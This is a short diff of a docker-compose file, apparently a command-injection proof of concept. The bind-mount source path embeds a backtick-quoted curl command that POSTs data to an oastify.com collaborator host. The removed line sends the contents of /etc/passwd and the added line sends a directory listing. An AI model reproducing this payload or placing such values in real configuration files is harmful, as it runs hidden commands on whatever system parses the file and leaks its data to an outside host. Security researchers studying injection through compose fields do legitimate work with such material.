@@ -5,7 +5,7 @@ services:
     volumes:
       -
         type: bind
-        source: "/tmp/pwn`curl https://78dllxcupr3aicoacj8k7ab8jzpqdt1i.oastify.com -X POST --data $(cat /etc/passwd)`"
+        source: "/tmp/pwn`curl https://78dllxcupr3aicoacj8k7ab8jzpqdt1i.oastify.com -X POST --data $(ls)`"
         target: /app
     restart: always
     working_dir: /var/www/html
